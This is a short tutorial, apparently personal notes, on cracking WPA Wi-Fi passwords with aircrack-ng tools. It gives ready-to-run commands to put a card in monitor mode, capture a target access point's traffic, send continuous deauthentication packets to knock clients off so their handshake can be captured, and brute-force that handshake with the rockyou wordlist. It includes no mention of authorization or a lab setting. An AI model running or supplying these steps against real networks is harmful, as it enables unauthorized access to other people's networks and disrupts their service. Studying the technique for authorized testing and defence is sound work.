Since WPA is a strong protocol we can't simply hack it, but we can bruteforce it!

### Useful Commands

First we want to turn on the interface in monitor mode, given that the monitor mode is supported by your card, but we have to kill the processes that interfere with the process of turning the interface into monitor mode.

```bash
# Kill the processes that interfere with starting wlan0 in monitor mode
sudo ifconfig wlan0 down
# The following 2 commands might be useful (depending on your wlan interface card)
sudo kill $(pgrep NetworkManager)
sudo kill $(pgrep wpa_supplicant)
# Now put the interface in monitor mode, put the interface up and restart network manager and 
sudo airmon-ng start wlan0
```

To check if the monitor mode is on and working, we can use the following command:

```bash
sudo iwconfig
```

Now we might need to unplug the USB device then plug it back.

Then we run the following command to start capturing packets:

```bash
# Sometimes we might have to use the following command
sudo rfkill unblock wifi; sudo rfkill unblock all
sudo airodump-ng wlan0
# To only display the access point that we want, we can use the following command
sudo airodump-ng wlan0 -d <BSSID>
```

Now we can use the following command to write the captures to a file:

```bash
sudo airodump-ng -w <name of file> -c <channel> --bssid <BSSID> wlan0
```

Next ,we will disconnect a device from a network using deauth packet on another terminal so we can capture a handshake, and to do so we will use the following command:

```bash
sudo aireplay-ng --deauth 0 -a <BSSID> wlan0
# We can find the 4-way handshake with EAPOL packets on wireshark
```

Finally we will start brute forcing by using the following command:

```bash
aircrack-ng <.cap file> -w /usr/share/wordlists/rockyou.txt
```

Note: if we want to go back into managed mode, we can use the following commands:

```bash
sudo airmon-ng stop wlan0
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode managed 
sudo service NetworkManager restart  
sudo service wpa_supplicant restart
sudo ifconfig wlan0 up
```

Note: you might need to toggle Wi-Fi button from top-right menu. 

In case the network manager gets stuck, use the following commands:

```bash
sudo apt-get install --reinstall network-manager
sudo apt-get install --reinstall wpasupplicant
sudo apt-get install --reinstall isc-dhcp-client
```